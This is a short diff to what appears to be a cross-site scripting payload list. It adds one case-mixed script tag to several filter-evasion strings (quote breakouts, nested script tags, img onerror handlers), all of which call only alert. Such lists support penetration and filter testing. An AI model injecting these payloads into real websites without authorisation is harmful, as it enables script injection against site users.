@@ -10,6 +10,7 @@ python3 -m http.server 80
 <script>alert('XSS')</script>
 "><script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
+<zzz><ScRiPt>alert("XSS")</ScRiPt>
 
 <img src=1 onerror=alert(1)>
 <><img src=1 onerror=alert(1)>
